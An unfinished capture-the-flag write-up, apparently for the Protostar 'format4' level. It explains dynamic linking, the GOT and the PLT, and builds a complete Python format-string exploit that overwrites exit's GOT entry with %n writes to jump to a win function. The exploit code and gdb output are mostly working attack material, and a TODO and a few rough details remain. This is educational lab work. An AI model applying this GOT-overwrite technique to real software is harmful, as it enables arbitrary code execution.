## Foreword


## Challenge Introduction

```bash
objdump -TR format4 

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   fgets
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   printf
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000      DF *UND*	00000000  GLIBC_2.0   exit
080485ec g    DO .rodata	00000004  Base        _IO_stdin_used
08049730 g    DO .bss	00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
```

Here is the original GOT value
```bash
(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	mov    esp,0x84da84
```

(gdb) set {int}0x8049724=0x80484b4

```bash
./format4 
AAAA %x %x %x %x
AAAA 200 b7fd8420 bffff614 41414141
```
Our provided argument is appeared on position 4 from the leaked stack. So after discovering where our argument appeared, the next step is to use that to do code redirect execution, but how we can do that? If we take look back at the source code:
```c
void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}
```
how from simple vulnerable function `printf()` could redirect us and land into `hello()` function? This is where we need to introduce the PLT and GOT sections in order to win this challenge but before those two concept brief introduction to dynamic linking will be helpful. 

## Dynamic Linking, GOT, and PLT Overview

```bash
0x8048503 <vuln+49>:	call   0x80483cc <printf@plt>
```

```bash
(gdb) disas 0x80483cc
Dump of assembler code for function printf@plt:
0x080483cc <printf@plt+0>:	jmp    DWORD PTR ds:0x804971c
0x080483d2 <printf@plt+6>:	push   0x20
0x080483d7 <printf@plt+11>:	jmp    0x804837c
End of assembler dump.
```

```bash
(gdb) disas 0x804971c
Dump of assembler code for function _GLOBAL_OFFSET_TABLE_:
0x08049700 <_GLOBAL_OFFSET_TABLE_+0>:	sub    al,0x96
0x08049702 <_GLOBAL_OFFSET_TABLE_+2>:	add    al,0x8
0x08049704 <_GLOBAL_OFFSET_TABLE_+4>:	clc    
0x08049705 <_GLOBAL_OFFSET_TABLE_+5>:	clc    
0x08049706 <_GLOBAL_OFFSET_TABLE_+6>:	push   DWORD PTR [edi-0x48009e00]
0x0804970c <_GLOBAL_OFFSET_TABLE_+12>:	xchg   edx,eax
0x0804970d <_GLOBAL_OFFSET_TABLE_+13>:	add    DWORD PTR [eax+ecx*1],0x30
0x08049711 <_GLOBAL_OFFSET_TABLE_+17>:	sub    al,0xef
0x08049713 <_GLOBAL_OFFSET_TABLE_+19>:	mov    bh,0x90
0x08049715 <_GLOBAL_OFFSET_TABLE_+21>:	fucomi st,st(2)
0x08049717 <_GLOBAL_OFFSET_TABLE_+23>:	mov    bh,0xc2
0x08049719 <_GLOBAL_OFFSET_TABLE_+25>:	add    DWORD PTR [eax+ecx*1],0xffffffd2
0x0804971d <_GLOBAL_OFFSET_TABLE_+29>:	add    DWORD PTR [eax+ecx*1],0xffffffe2
0x08049721 <_GLOBAL_OFFSET_TABLE_+33>:	add    DWORD PTR [eax+ecx*1],0xfffffff2
0x08049725 <_GLOBAL_OFFSET_TABLE_+37>:	add    DWORD PTR [eax+ecx*1],0x0
End of assembler dump.
```

## Exploitation
```py
import struct

HELLO = 0x80484b4
EXIT_PLT = 0x8049724

# Convert the hexadecimal number to a string and remove the '0x' prefix
hex_hello_str = hex(HELLO)[2:] # EO: "80484b4"

def pad(s):
        # `512-len(s)` is used to adjust the total string that will be returned to be 512
        return s+"X"*(512-len(s))

exploit = ""
exploit += struct.pack("I",EXIT_PLT)
exploit += struct.pack("I",EXIT_PLT+2)
```
TODO: tell a reason why there is `EXIT_PLT+2`, explain each the code

### We will try to write the 16 lower bits first
```py
lower_bits = hex_hello_str[-4:] # EO: "84b4"
lower_bits_dec = int(lower_bits,16) # EO: 33972
adjusted_lower_bits = lower_bits_dec-8

exploit += "%4${0}x".format(adjusted_lower_bits)

print(pad(exploit))
```
1. The variable `lower_bits` is used to extract the 2 lower bytes `84b4` from `HELLO` `0x80484b4`
2. `lower_bits_dec` is a conversion from hex to decimal
3. `adjusted_lower_bits` it's about adjusting the total number that will be written by `%n`, remember that in the beginning we were using two `exit@PLT` addresses, `EXIT_PLT` and `EXIT_PLT+2`. So the total is 8 bytes, and we need to substract it with `33972` otherwise it will add extra 8 bytes to `33972` which become `84bc` in hex. `84bc` is not what we want.

To demonstrate, this is the wrong example, without substracting 8 bytes, and here is the GOT output:
```bash
(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x84da84bc
```


### upper bits
```py
upper_bits = hex_hello_str[:3]
upper_bits_dec = int(upper_bits,16)
adjusted_upper_bits = upper_bits_dec - lower_bits_dec + 2**16
exploit += "%5${0}x".format(adjusted_upper_bits)
exploit += "%5$n"
```


### Finally the solution is
```py
import struct

HELLO = 0x80484b4
EXIT_PLT = 0x8049724

# Convert the hexadecimal number to a string and remove the '0x' prefix
hex_hello_str = hex(HELLO)[2:]

def pad(s):
	# `512-len(s)` is used to adjust the total string that will be returned to be 512
	return s+"X"*(512-len(s))

exploit = ""
exploit += struct.pack("I",EXIT_PLT)
exploit += struct.pack("I",EXIT_PLT+2)

# write the lower 16 bits first
lower_bits = hex_hello_str[-4:] # expected_ouput: 84b4
lower_bits_dec = int(lower_bits,16) # expected_output: 33972
adjusted_lower_bits = lower_bits_dec-8

exploit += "%4${0}x".format(adjusted_lower_bits)

# now, finally we can write the first lower 16 bits
exploit += "%4$n"

# and then write the 16 upper bits
upper_bits = hex_hello_str[:3]
upper_bits_dec = int(upper_bits,16)
adjusted_upper_bits = upper_bits_dec-lower_bits_dec+2**16
exploit += "%5${0}x".format(adjusted_upper_bits)
exploit += "%5$n"

print(pad(exploit))
```
